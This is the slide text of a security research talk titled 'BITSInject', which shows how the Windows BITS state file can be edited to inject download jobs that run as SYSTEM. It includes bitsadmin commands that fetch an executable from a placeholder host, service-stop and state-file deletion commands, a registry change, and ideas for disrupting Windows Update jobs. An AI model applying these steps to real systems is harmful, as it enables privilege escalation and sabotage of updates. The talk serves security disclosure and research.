BITSInject
Control your BITS, get SYSTEM
Dor Azouri
Security Researcher @SafeBreach
BITS Background & Terms
PowerShell
bitsadmin
...
BITS Job
Download
Upload
Upload-Reply
COM Interfaces (C/C++)
qmgrprxy.dll
qmgr.dll
State File
More Background
Available since 2001 (Windows XP)
Most known use: Windows Update
Advanced features
Known Malicious Uses
BITS as a malware downloader
As a persistency mechanism (e.g. DNSChanger/Zlob.Q)
As C&C communication
DEMO
The Abuse
The inspiration?
the way WU downloads and installs updates
The Drive? Jealousy
… of how WU adds SYSTEM jobs
The Enabling Feature
SetNotifyCmdLine
Naive Try
bitsadmin /CREATE I_WANT_YOUR_SYSTEM
bitsadmin /ADDFILE I_WANT_YOUR_SYSTEM 
http://site.com/software.exe c:\temp\software.exe
God Created a Rock He Can’t Pick Up
bitsadmin /CANCEL I_WANT_YOUR_SYSTEM
Unable to add file to job - 0x800704dd
The operation being requested was not performed 
because the user has not logged on to the network
How Does wuaueng Do the Things He Does?
CoSwitchCallContext to the COM intf of qmgr.dll
qmgr!CJobManagerExternal::CreateJob -> 
qmgr!CJob::AddFile -> 
qmgr!CJob::Resume -> 
qmgr!CJob::Transfer -> 
qmgr!CJob::BeginDownload
How Does wuaueng Do the Things He Does?
CoSwitchCallContext to the COM intf of qmgr.dll
qmgr!CJobManagerExternal::CreateJob -> 
qmgr!CJob::AddFile -> 
qmgr!CJob::Resume -> 
qmgr!CJob::Transfer -> 
qmgr!CJob::BeginDownload
Going after wuaueng
Compare flow of calls between wuaueng and bitsadmin
1.
qmgr!CJobManagerExternal::CreateJob -- identical
2.
qmgr!CJobExternal::AddFile -- identical, but:
Exception is thrown here (0x800704dd)
Faking Session ID
SwitchToLogonToken
{Client SID} =
(From Job object)
{Session ID} =
GetTokenInformation(12)
CloneUserToken
CLoggedOnUsers::FindUser({SID},...) in {Session ID}
Faking Session ID
SwitchToLogonToken
{Client SID} =
(From Job object)
{Session ID} =
GetTokenInformation(12)
CloneUserToken
CLoggedOnUsers::FindUser({SID},...) in {Session ID}
{SYSTEM} is NOT logged 
on in session {1}
Faking Session ID
SwitchToLogonToken
{Client SID} =
(From Job object)
{Session ID} =
GetTokenInformation(12)
CloneUserToken
CLoggedOnUsers::FindUser({SID},...) in {Session ID}
{Session ID} = 0
public enum JOB_STATE 
{
    Queued,
    Connecting,
    Transferring,
    Suspended,
    Error,
    TransientError,
    Transferred,
    Acknowledged,
    Cancelled,
    Unknown
};
The State File is the Supervisor
Represents the job queue
C:\ProgramData\Microsoft\Network\Downloader\(qmgr0.dat|qmgr1.dat)
Alternated update, current is:
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\BITS\StateIndex
The State File
●
Straight-forward
e.g. string representation:
CJob::Serialize(class CQmgrWriteStateFile &) calls 
CQmgrStateFiles::Write(void const *,ulong) for each job property
●
Unencrypted
●
Partially protected
07
00
00
00
‘S’
00
‘Y’
00
‘S’
00
‘T’
00
‘E’
00
‘M’
00
00
00
public enum JOB_STATE 
{
    Queued,
    Connecting,
    Transferring,
    Suspended,
    Error,
    TransientError,
    Transferred,
    Acknowledged,
    Cancelled,
    Unknown
};
sc stop bits
timeout 5
del /Q /F C:\ProgramData\Microsoft\Network\Downloader\*
>>    Put modified state file
sc start bits
Migration of the Queue
Just copy-paste the state files between machines
Windows 7 Header:
F5 6A 19 2B 7C 00 8F 43 8D 12 1C FC A4 CC 9B 76
Windows 10 Header:
28 32 ED 09 A6 C7 E9 45 8F 6D 36 D9 46 C2 7C 3E 00 00 00 00 00 00 00 00
A Cleaner Method
Version Dependent Header
State File Header
Queue Header
Jobs Counter = n
Job Header
Job #0
Job Footer
...
Job Header
Job #n
Job Footer
Queue Footer
Job Header
Job #x
Job Footer
n++
BITSInject.py
Injects a job with LocalSystem rights
Job is removed when finished
Allows editing some of the job’s parameters, more in the future
DEMO
Interactive Services Detection - UI0Detect
sc stop UI0Detect
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Windows /v 
NoInteractiveServices /t REG_DWORD /d 1 /f
sc start UI0Detect
OR 
Non-interactive exe
SimpleBITSServer.py
A simple python implementation of a BITS server
Responds without a Content-Length header
Accelerating the method by pushing job into the ERROR state
Other Potential Abuses
Interfere with a software update job:
1.
WU choking using file name exhaustion
2.
Change job state using BITSInject.py
3.
Completely remove a job from queue using BITSInject.py
Links
BITSInject (Tool code + Parser):
https://github.com/SafeBreach-Labs/BITSInject
SimpleBITSServer:
https://github.com/SafeBreach-Labs/SimpleBITSServer
Email: PI:EMAIL
Twitter: @bemikre